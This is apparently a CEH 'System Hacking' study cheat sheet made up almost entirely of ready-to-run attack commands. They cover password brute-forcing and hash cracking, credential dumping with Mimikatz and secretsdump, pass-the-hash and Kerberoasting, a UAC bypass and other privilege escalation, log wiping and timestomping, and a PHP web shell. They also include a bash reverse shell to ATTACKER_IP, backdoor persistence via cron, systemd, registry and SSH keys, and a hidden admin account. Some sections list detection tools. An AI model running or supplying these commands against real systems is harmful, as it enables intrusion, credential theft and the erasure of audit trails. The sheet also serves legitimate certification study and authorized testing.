> For authorized security testing, red team exercises, and educational study only.

# System Hacking (CEH Module 06)

Techniques for gaining, escalating, and maintaining access to target systems, plus methods for covering tracks and hiding data.

## Password Cracking — Online Attacks

```bash
# Hydra — HTTP POST login brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  192.168.1.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# Hydra — SSH brute-force
hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4

# Hydra — RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.10

# Medusa — SMB brute-force
medusa -h 192.168.1.10 -u admin -P passwords.txt -M smbnt

# Medusa — FTP with combo file (user:pass per line)
medusa -h 192.168.1.10 -C creds.txt -M ftp

# Ncrack — RDP brute-force with timing
ncrack -p 3389 --user administrator -P passwords.txt 192.168.1.10 -T 3

# Ncrack — multiple services
ncrack 192.168.1.10 -p ssh:22,rdp:3389 -U users.txt -P passwords.txt
```

## Password Cracking — Offline Attacks

```bash
# Hashcat — NTLM hash (mode 1000)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Hashcat — MD5 with rules
hashcat -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Hashcat — SHA-512 Unix ($6$) (mode 1800)
hashcat -m 1800 shadow_hashes.txt wordlist.txt

# Hashcat — brute-force, 8-char alphanumeric
hashcat -m 1000 hashes.txt -a 3 ?a?a?a?a?a?a?a?a

# Hashcat — show cracked passwords
hashcat -m 1000 hashes.txt --show

# John the Ripper — auto-detect hash type
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# John — with rules
john hashes.txt --wordlist=wordlist.txt --rules=All

# John — incremental (brute-force) mode
john hashes.txt --incremental

# Rainbow tables — generate with rtgen (RainbowCrack)
rtgen ntlm loweralpha-numeric 1 8 0 3800 33554432 0

# Rainbow tables — lookup
rcrack /path/to/tables/ -h <NTLM_hash>
```

## Windows Password Hashing & Extraction

```powershell
# SAM database location (offline, requires SYSTEM hive)
# C:\Windows\System32\config\SAM
# C:\Windows\System32\config\SYSTEM

# Copy SAM + SYSTEM from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .

# Registry save (requires admin)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
```

```bash
# Impacket secretsdump — remote extraction via SMB
impacket-secretsdump administrator:Password1@192.168.1.10

# Impacket secretsdump — from local SAM/SYSTEM files
impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# Impacket secretsdump — extract NTDS.dit (domain controller)
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL
```

```
# Mimikatz — dump LSASS credentials
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::msv
mimikatz # lsadump::sam
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Mimikatz — dump cached credentials
mimikatz # lsadump::cache
```

```
NTLM hash format:  username:RID:LM_hash:NTLM_hash:::
LM hashing:        disabled by default since Vista/2008
NTLM (NT hash):    MD4(UTF-16LE(password))  — no salt
```

## Linux Password Hashing

```bash
# /etc/shadow hash format
# username:$id$salt$hash:last_changed:min:max:warn:inactive:expire:

# Hash type identifiers
# $1$  = MD5         (legacy, weak)
# $5$  = SHA-256     (decent)
# $6$  = SHA-512     (standard on most distros)
# $y$  = yescrypt    (modern, used in Debian 11+/Ubuntu 22.04+)
# $2b$ = bcrypt      (used in some BSD/specialized configs)

# Unshadow — combine passwd and shadow for John
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat — crack $6$ (SHA-512 crypt)
hashcat -m 1800 shadow_hashes.txt wordlist.txt

# Hashcat — crack $y$ (yescrypt) (mode 28200 in newer hashcat)
hashcat -m 28200 shadow_hashes.txt wordlist.txt

# Check current hash algorithm in use
grep ENCRYPT_METHOD /etc/login.defs
```

## Pass-the-Hash / Pass-the-Ticket

```bash
# PtH — Impacket psexec (NTLM hash, no plaintext password needed)
impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
  administrator@192.168.1.10

# PtH — Impacket wmiexec
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# PtH — CrackMapExec (spray hash across subnet)
crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH

# PtH — CrackMapExec command execution
crackmapexec smb 192.168.1.10 -u admin -H NTLM_HASH -x "whoami"

# Overpass-the-Hash — request TGT from NTLM hash (Impacket)
impacket-getTGT -hashes :NTLM_HASH corp.local/administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local

# Pass-the-Ticket — export and reuse Kerberos tickets
# (Mimikatz)
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt ticket.kirbi

# PtT with Impacket — use ccache file
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass corp.local/user@target.corp.local

# Kerberoasting — request TGS for service accounts
impacket-GetUserSPNs -request -dc-ip 192.168.1.1 corp.local/user:password
hashcat -m 13100 tgs_hashes.txt wordlist.txt

# AS-REP Roasting — accounts without pre-auth
impacket-GetNPUsers -dc-ip 192.168.1.1 corp.local/ -usersfile users.txt -no-pass
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

## Privilege Escalation — Linux

```bash
# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
find / -perm -6000 -type f 2>/dev/null   # both

# Sudo misconfiguration
sudo -l                                    # list allowed commands
# Exploit NOPASSWD entries or GTFOBins-listed binaries

# Writable /etc/passwd (legacy systems)
openssl passwd -1 -salt xyz password123
echo 'newroot:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

# Kernel exploit enumeration
uname -a
cat /etc/os-release
# Search exploit-db / searchsploit for matching kernel version
searchsploit linux kernel <version> privilege escalation

# Capabilities
getcap -r / 2>/dev/null
# e.g., python3 with cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Cron jobs running as root
cat /etc/crontab
ls -la /etc/cron.*
# Look for writable scripts called by root cron jobs

# Writable service files
find /etc/systemd/system/ -writable -type f 2>/dev/null

# LinPEAS automated enumeration
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

## Privilege Escalation — Windows

```powershell
# Unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

# Service binary permissions (icacls)
icacls "C:\Program Files\VulnApp\service.exe"

# DLL hijacking — find missing DLLs
# Use Process Monitor (procmon) to filter for "NAME NOT FOUND" on DLL loads

# UAC bypass — fodhelper.exe (Win 10)
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# Always install elevated check
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Token impersonation (SeImpersonatePrivilege)
# Use PrintSpoofer, JuicyPotato, GodPotato, etc.
whoami /priv

# WinPEAS automated enumeration
.\winPEASx64.exe
```

## Keyloggers & Spyware

```
Types:
  Hardware    Physical device between keyboard and PC, USB/PS2 inline
  Software    Application-level, captures keystrokes via OS API hooks
  Kernel      Loaded as driver/module, intercepts at kernel level
  Acoustic    Analyzes keystroke sounds (research/advanced)

Detection:
  - Check Task Manager / ps aux for suspicious processes
  - Inspect startup programs (msconfig, autoruns, systemctl)
  - Monitor outbound network connections (netstat, Wireshark)
  - Use anti-keylogger tools (KeyScrambler, Zemana)
  - Check USB ports for inline hardware devices
```

## Rootkits

```
Types:
  User-mode       Replaces system binaries or hooks shared libraries (LD_PRELOAD)
  Kernel-mode     Loaded as kernel module (LKM), hooks syscall table
  Hypervisor      Runs beneath the OS as a thin hypervisor (Blue Pill concept)
  Firmware/UEFI   Persists in BIOS/UEFI firmware, survives OS reinstall
  Bootloader      Infects MBR/VBR, loads before OS (Bootkits)

Detection:
```

```bash
# rkhunter
rkhunter --update
rkhunter --check --sk

# chkrootkit
chkrootkit

# Cross-view detection: compare API results vs raw disk reads
# Integrity checking: compare file hashes against known-good baselines
# Memory analysis: volatility framework for live memory forensics
volatility -f memory.dump --profile=LinuxProfile linux_check_syscall
```

## Steganography

```bash
# steghide — embed data in JPEG/BMP/WAV/AU
steghide embed -cf image.jpg -ef secret.txt -p passphrase
steghide extract -sf image.jpg -p passphrase
steghide info image.jpg

# OpenStego — embed in PNG (GUI tool or CLI)
openstego embed -mf secret.txt -cf cover.png -sf stego.png
openstego extract -sf stego.png -xd output_dir/

# Snow — whitespace steganography in text files
snow -C -m "hidden message" -p password cover.txt stego.txt
snow -C -p password stego.txt    # extract

# Steganalysis / detection
binwalk image.jpg               # scan for embedded files
strings image.jpg | less        # look for plaintext artifacts
exiftool image.jpg              # metadata inspection
zsteg image.png                 # LSB stego detection (PNG/BMP)
stegdetect image.jpg            # automated JPEG stego detection
```

## Covering Tracks

```powershell
# Windows — clear all event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
for /F "tokens=*" %1 in ('wevtutil el') do wevtutil cl "%1"

# Windows — disable event logging
auditpol /set /category:* /success:disable /failure:disable

# Windows — timestomping with PowerShell
(Get-Item "C:\file.txt").LastWriteTime = "01/01/2020 12:00:00"
(Get-Item "C:\file.txt").CreationTime = "01/01/2020 12:00:00"
(Get-Item "C:\file.txt").LastAccessTime = "01/01/2020 12:00:00"
```

```bash
# Linux — clear auth logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/wtmp
echo "" > /var/log/btmp

# Linux — remove specific entries (more subtle)
sed -i '/192\.168\.1\.50/d' /var/log/auth.log

# Linux — clear bash history
history -c && history -w
echo "" > ~/.bash_history
unset HISTFILE
export HISTSIZE=0

# Linux — timestomping
touch -t 202001011200.00 /path/to/file
# Copy timestamps from another file
touch -r /etc/hosts /path/to/file
```

## NTFS Alternate Data Streams

```powershell
# Hide data in ADS
echo "hidden payload" > legit.txt:secret.txt
type payload.exe > legit.txt:payload.exe

# List ADS on a file
dir /R legit.txt
Get-Item legit.txt -Stream *

# Read from ADS
more < legit.txt:secret.txt
Get-Content legit.txt -Stream secret.txt

# Execute from ADS
wmic process call create "C:\path\legit.txt:payload.exe"

# Remove ADS
Remove-Item legit.txt -Stream secret.txt

# Linux — dot files for hiding
mv malware .malware
ls -la    # shows hidden files
```

## Maintaining Access

```bash
# Web shells — simple PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
# Usage: http://target/shell.php?cmd=whoami

# Reverse shell — bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Netcat listener (attacker side)
nc -lvnp 4444
```

```bash
# Linux persistence — cron
(crontab -l; echo "*/5 * * * * /tmp/.backdoor") | crontab -

# Linux persistence — systemd service
cat > /etc/systemd/system/updater.service << 'EOF'
[Unit]
Description=System Updater

[Service]
ExecStart=/tmp/.backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable updater.service

# Linux persistence — bashrc
echo '/tmp/.backdoor &' >> ~/.bashrc

# Linux persistence — SSH authorized_keys
echo "ssh-rsa AAAA...attacker_key" >> ~/.ssh/authorized_keys
```

```powershell
# Windows persistence — registry Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\backdoor.exe"

# Windows persistence — scheduled task
schtasks /create /tn "SystemUpdate" /tr "C:\backdoor.exe" /sc onlogon /ru SYSTEM

# Windows persistence — WMI event subscription
# (commonly used by advanced malware for fileless persistence)

# Windows persistence — new admin account
net user hacker P@ssw0rd /add
net localgroup Administrators hacker /add
```

## Tips

- Always verify hash types before attempting cracks -- wrong mode wastes hours.
- Use `--username` flag with hashcat when hashes include `user:hash` format.
- Rule-based attacks (hashcat `-r`, john `--rules`) yield better results per attempt than pure brute-force.
- Rainbow tables are only effective against unsalted hashes (e.g., NTLM); salted hashes defeat them.
- For privilege escalation, always run automated enumeration (LinPEAS/WinPEAS) first to save time.
- GTFOBins (Linux) and LOLBAS (Windows) catalog binaries useful for escalation and living-off-the-land.
- ADS is invisible to `dir` without `/R` -- always check when hunting for hidden data on NTFS.
- Covering tracks should be part of every red team exercise to simulate realistic threat actors.

## See Also

- `sheets/offensive/password-attacks.md` (if available)
- `sheets/security/incident-response.md` (if available)

## References

- CEH v13 Module 06 — System Hacking
- [Hashcat Wiki — Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [MITRE ATT&CK — Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [MITRE ATT&CK — Privilege Escalation](https://attack.mitre.org/tactics/TA0004/)
- [MITRE ATT&CK — Persistence](https://attack.mitre.org/tactics/TA0003/)
- [MITRE ATT&CK — Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
